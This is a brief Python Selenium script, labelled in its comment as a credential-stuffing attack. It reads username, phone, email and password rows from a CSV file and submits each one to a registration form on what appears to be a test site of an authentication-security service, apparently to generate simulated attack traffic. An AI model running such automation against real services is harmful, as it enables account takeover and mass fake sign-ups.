#credential stuffing attacker has multiple credentials with different email and password

from selenium import webdriver

from selenium.webdriver.common.selenium_manager import SeleniumManager

import time
import pandas as pd

# driver=webdriver.Chrome(ChromeDriverManager().install())
# driver=webdriver.Chrome("C:\myData\Python_Automation\chromedriver\chromedriver-win32\chromedriver.exe")
# driver=webdriver.Chrome("C:\myData\Python_Automation\chromedriver\chromedriver-win32\chromedriver.exe")
driver = webdriver.Firefox()
driver.implicitly_wait(10)

df = pd.read_csv('cs_data.csv').dropna()

for _,curr_row in df.iterrows():
    username = curr_row['username']
    mobile = curr_row['mobile']
    email = curr_row['emailid']
    password = curr_row['password']
    driver.implicitly_wait(10)
    driver.get("http://test.authsafe.ai/register.php")
    driver.find_element("id", "inputName").send_keys(username)
    driver.find_element("id","phone").send_keys(mobile)
    driver.find_element("id","inputEmail").send_keys(email)
    driver.find_element("name","password").send_keys(password)
    driver.find_element("id","register-button").click()
